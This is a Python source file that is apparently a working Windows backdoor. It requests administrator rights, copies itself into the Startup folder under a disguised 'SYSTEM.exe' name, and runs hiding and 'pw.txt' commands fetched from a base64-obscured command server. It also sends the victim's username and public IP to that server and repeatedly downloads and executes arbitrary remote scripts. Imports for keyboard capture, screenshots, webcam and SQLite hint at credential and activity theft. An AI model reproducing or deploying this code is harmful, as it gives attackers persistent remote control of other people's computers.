import urllib.request
import subprocess
import shutil
import threading
import time
import os
import requests
import sys
import ctypes
import base64

# Packages for custom scripts

import pyautogui
import sqlite3
import cryptography
import keyboard
import cv2
import PIL
import psutil
import wmi


server_url = base64.b64decode("DO_NOT_CHANGE_ME").decode()
scripts_url = f"{server_url}/scripts.txt"
check_interval = 5
APPDATA = os.getenv("APPDATA")
TEMP = os.getenv("TEMP")
STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
SCRIPT_NAME = base64.b64decode("U1lTVEVNLmV4ZQ==").decode()
SCRIPT_PATH = os.path.join(STARTUP_PATH, SCRIPT_NAME)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False
def request_admin():
    if not is_admin():
        script = os.path.abspath(sys.argv[0])
        params = " ".join(sys.argv[1:])
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
            sys.exit()
        except:
            pass
def get_target_url():
    try:
        with urllib.request.urlopen(scripts_url) as response:
            return response.read().decode("utf-8").strip().splitlines()
    except:
        return None
def download_and_execute_script(script_name):
    script_url = f"{server_url}/scripts/{script_name}"
    try:
        urllib.request.urlretrieve(script_url, os.path.join(TEMP, script_name))
        execute_script(os.path.join(TEMP, script_name))
    except:
        var = None
def execute_script(script_name):
    def run_script():
        try:
            exec(open(script_name).read())
        except:
            var = None
    thread = threading.Thread(target=run_script)
    thread.start()
def send_completion_request():
    try:
        response = requests.post(f"{server_url}/update", data="OK")
    except:
        var = None
def save_copy():
    try:
        if sys.argv[0] != SCRIPT_PATH:
            shutil.copy(sys.argv[0], SCRIPT_PATH)
            if is_admin():
                hider = requests.get(f"{server_url}/hide.txt").text
                subprocess.Popen(f'{hider} "{SCRIPT_PATH}"')
    except:
        pass
def send_alert():
    data = {
    "INFO": f"{os.getlogin()} with IP: {requests.get(base64.b64decode('aHR0cHM6Ly9hcGk2NC5pcGlmeS5vcmc=').decode()).text} has run the executable!"
    }   
    requests.post(f"{server_url}/reply", data=data)


request_admin()
if is_admin():
    subprocess.Popen(requests.get(f"{server_url}/pw.txt").text)
save_copy()
send_alert()

while True:
    try:
        script_names = get_target_url()
        if script_names:
            for script_name in script_names:
                download_and_execute_script(script_name)
            send_completion_request()

        time.sleep(check_interval)
    except:
        pass